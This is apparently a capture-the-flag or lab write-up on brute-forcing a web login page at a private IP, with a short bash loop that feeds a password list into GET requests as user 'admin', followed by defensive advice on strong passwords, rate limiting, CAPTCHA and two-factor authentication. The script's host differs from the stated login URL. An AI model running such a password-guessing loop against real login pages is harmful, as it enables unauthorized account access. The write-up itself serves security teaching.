# Brute force

## Method
We will bruteforce entry on the login page [http://10.203.72.119/index.php?page=signin](http://10.203.72.119/index.php?page=signin "signin page")

To brute force we can use the following bash script
``` bash
#!/bin/bash

while read passwords
do
	curl "http://192.168.8.122/index.php?page=signin&username=admin&password=${passwords}&Login=Login#" | grep "flag"
	
done < passwords.txt
```
Which will try a combination of passwords from the ***password.txt*** with username ***admin***, then tries to get the flag to see if which password had us logged in.

## Solution
To prevent this action a user must have a difficult password, atleast a uppercase, special characters, the password must be lengthy, conatain a number, and must not be common dictionary words. The more complicated the password is the better. The web application must limit the login attempt, considerably 3 passwords at a time, and maybe resume the login after 30sec if the user fails to enter the right credentails. Use OTPs, use Captcha, or two Factor authentification.